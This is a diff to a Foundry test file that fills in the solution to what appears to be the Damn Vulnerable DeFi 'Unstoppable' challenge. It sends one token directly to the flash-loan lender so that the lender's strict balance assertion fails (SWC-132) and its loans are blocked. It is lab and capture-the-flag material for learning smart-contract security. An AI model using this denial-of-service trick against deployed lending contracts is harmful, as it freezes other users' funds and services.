@@ -60,7 +60,9 @@ contract Unstoppable is DSTest {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        // https://swcregistry.io/docs/SWC-132
+        vm.prank(attacker);
+        dvt.transfer(address(unstoppableLender), 1);
         /** EXPLOIT END **/
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
